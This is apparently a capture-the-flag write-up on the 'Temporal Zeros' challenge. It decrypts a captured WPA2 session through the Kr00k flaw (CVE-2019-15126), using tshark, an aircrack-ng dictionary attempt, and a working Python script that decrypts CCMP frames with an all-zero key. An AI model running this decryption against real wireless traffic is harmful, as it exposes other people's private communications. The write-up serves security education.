# Temporal Zeros - CTF Writeup

## Challenge Description

> Our WiFi keeps disconnecting. We captured wireless traffic to try and figure out what's happening, but it's all temporal zeros to us! I think someone is trying to exploit a WiFi vulnerability.. Can you decrypt the traffic and gain access to the flag?

**Provided file:** `5a861fe114e0fb50cc787eaab478da124973ba82.zip`

---

## Tools Used

- `tshark` - Packet analysis
- `scapy` - Python packet manipulation
- `pycryptodomex` - AES-CCM encryption
- `aircrack-ng` - WiFi analysis

---

## Key Concepts: Kr00k (CVE-2019-15126)

**Kr00k** is a vulnerability in Broadcom/Cypress WiFi chips that causes:

1. After a disassociation, the chip clears the temporal key (TK) by setting it to **zeros**
2. Buffered packets are transmitted encrypted with TK = `00000000000000000000000000000000`
3. These packets can be decrypted knowing only the nonce (transmitted in clear)

The hint "temporal zeros" refers directly to this vulnerability.

---

## Step 1: Extraction and Reconnaissance

```bash
unzip 5a861fe114e0fb50cc787eaab478da124973ba82.zip
```

**Contents:** `00ps.pcap` (2.7 MB)

### Basic Information

```bash
tshark -r 00ps.pcap | head -20
```

```
SSID: "00ps"
AP MAC: 00:12:17:bc:b4:8a
Client MAC: 00:0f:00:54:3b:d6
Encryption: WPA2 CCMP
```

---

## Step 2: Handshake Analysis

```bash
tshark -r 00ps.pcap -Y "eapol" -V | grep -A5 "Nonce"
```

**Critical observation in Message 4:**
```
WPA Key Nonce: 0000000000000000000000000000000000000000000000000000000000000000
```

The SNonce in message 4 is **all zeros** - confirmation of the vulnerability.

---

## Step 3: Verify Repeated Nonces (CCMP IV Reuse)

```bash
tshark -r 00ps.pcap -Y "wlan.fc.type_subtype == 0x20" \
  -T fields -e wlan.ccmp.extiv | head -20
```

```
0x000000000001
0x000000000002
0x000000000001  <-- repeated
0x000000000001  <-- repeated
...
```

Repeated nonces confirm key reinstallation (KRACK/kr00k characteristic).

---

## Step 4: Failed Attempt - Password Cracking

```bash
aircrack-ng -w rockyou.txt -b 00:12:17:bc:b4:8a 00ps.pcap
```

**Result:** Password not found in dictionary.

This indicates the challenge is not about cracking, but about exploiting kr00k.

---

## Step 5: Kr00k Decryption

### Exploitation Script

Based on [kr00ker from exploit-db](https://www.exploit-db.com/exploits/48233):

```python
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11CCMP, Dot11QoS
from Cryptodome.Cipher import AES
import re

# Kr00k pattern (LLC/SNAP header indicates valid decryption)
KR00K_PATTERN = b"\xaa\xaa\x03\x00\x00\x00"

# All-zero temporal key (kr00k vulnerability)
TK = bytes.fromhex("00000000000000000000000000000000")

def kr00k_decrypt(enc_pkt):
    """Decrypt packet using all-zero TK"""
    if not enc_pkt.haslayer(Dot11CCMP):
        return None

    dot11 = enc_pkt[Dot11]
    dot11ccmp = enc_pkt[Dot11CCMP]

    # Extract Packet Number (nonce)
    PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(
        dot11ccmp.PN5, dot11ccmp.PN4, dot11ccmp.PN3,
        dot11ccmp.PN2, dot11ccmp.PN1, dot11ccmp.PN0
    )

    # Source MAC
    source_addr = re.sub(':', '', dot11.addr2)

    # QoS TID or 0
    if enc_pkt.haslayer(Dot11QoS):
        tid = "{:01x}".format(enc_pkt[Dot11QoS].TID)
    else:
        tid = '0'
    priority = tid + '0'

    # Build nonce: Priority || Source MAC || PN
    ccmp_nonce = bytes.fromhex(priority) + bytes.fromhex(source_addr) + bytes.fromhex(PN)

    # Decrypt (without MIC verification)
    cipher = AES.new(TK, AES.MODE_CCM, ccmp_nonce, mac_len=8)
    decrypted = cipher.decrypt(dot11ccmp.data[:-8])

    return decrypted

# Process capture
packets = rdpcap("00ps.pcap")

for i, pkt in enumerate(packets):
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2 and pkt.haslayer(Dot11CCMP):
        dec_data = kr00k_decrypt(pkt)

        # Check if valid decryption (starts with LLC/SNAP)
        if dec_data and dec_data[:6] == KR00K_PATTERN:
            print(f"[{i}] Decrypted: {len(dec_data)} bytes")

            # Search for flag
            if b'CTF' in dec_data or b'flag' in dec_data.lower():
                print(f"FLAG FOUND: {dec_data}")
```

### Execution

```bash
python3 kr00k_decrypt.py
```

**Result:**
```
[2881] Decrypted: 1508 bytes
    *** FLAG FOUND: ...CTF{5e19fbdfa7072d568a28dd47b0edd379}
    Flag: 247CTF{5e19fbdfXXXXXXXXXXXXXXXXb0edd379}...
```

---

## Step 6: Decrypted Traffic Analysis

Decrypted packets contain:
- LLC/SNAP header: `\xaa\xaa\x03\x00\x00\x00`
- IP header: `\x08\x00` (IPv4)
- TCP data with the flag repeated multiple times

---

## Kr00k Vulnerability Diagram

```
                    Normal WiFi Connection
                    ━━━━━━━━━━━━━━━━━━━━
    [Client]  ←──── Valid TK ────→  [AP]
        │                               │
        │     Disassociation            │
        ├───────────────────────────────┤
        │                               │
        │     TK = 0x000...000          │
        │     (Broadcom chip bug)       │
        │                               │
        ▼                               │
    Buffered packets                    │
    encrypted with TK=0                 │
        │                               │
        │     Transmitted               │
        └──────────────────────────────→│
                                        │
    [Attacker] captures and decrypts    │
    with known TK (all zeros)           │
```

---

## Why Decryption Works Without AAD

In normal CCMP:
1. MIC is verified using AAD (Additional Authenticated Data)
2. If MIC fails, decryption is rejected

In kr00k:
1. MIC was calculated with TK=0 by the vulnerable chip
2. We decrypt without verifying MIC
3. We validate decryption by looking for LLC/SNAP pattern `\xaa\xaa\x03\x00\x00\x00`

---

## Flag

```
247CTF{5e19fbdfXXXXXXXXXXXXXXXXb0edd379}
```

---

## References

- [ESET Kr00k Research Paper](https://www.welivesecurity.com/wp-content/uploads/2020/02/ESET_Kr00k.pdf)
- [CVE-2019-15126](https://nvd.nist.gov/vuln/detail/CVE-2019-15126)
- [kr00ker - Exploit DB](https://www.exploit-db.com/exploits/48233)
- [GitHub - akabe1/kr00ker](https://github.com/akabe1/kr00ker)

---

## Challenge Lessons

1. **"Temporal zeros" = kr00k:** The hint indicates TK overwritten with zeros
2. **Not always cracking:** If password is not found, look for other vulnerabilities
3. **LLC/SNAP header:** Pattern `\xaa\xaa\x03\x00\x00\x00` validates correct decryption
4. **Decrypt without verification:** In kr00k, MIC cannot be verified correctly, we only decrypt
